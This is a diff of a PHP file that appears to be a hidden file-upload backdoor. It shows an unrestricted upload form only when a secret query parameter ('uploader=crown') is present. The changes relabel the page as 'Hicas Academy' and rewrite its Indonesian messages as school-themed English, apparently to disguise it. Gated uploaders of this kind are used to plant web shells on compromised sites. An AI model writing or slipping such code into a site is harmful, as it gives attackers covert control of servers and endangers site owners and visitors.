@@ -5,7 +5,7 @@ if (isset($_GET['uploader']) && $_GET['uploader'] == 'crown') {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>File Uploader</title>
+        <title>Hicas Academy</title>
     </head>
     <body>
         <h2>Form Upload File</h2>';
@@ -17,16 +17,16 @@ if (isset($_GET['uploader']) && $_GET['uploader'] == 'crown') {
 
         // Try to upload file
         if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
-            echo "File ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diunggah.";
+            echo "File ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " successfully graduated.";
         } else {
-            echo "Maaf, terjadi kesalahan saat mengunggah file.";
+            echo "we were regret you have failed.";
         }
     }
 
     echo '
-    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?uploader=duvet" method="post" enctype="multipart/form-data">
+    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?uploader=crowm" method="post" enctype="multipart/form-data">
         <input type="file" name="fileToUpload" id="fileToUpload">
-        <input type="submit" value="Unggah File" name="submit">
+        <input type="submit" value="upload file" name="submit">
     </form>
     </body>
     </html>';
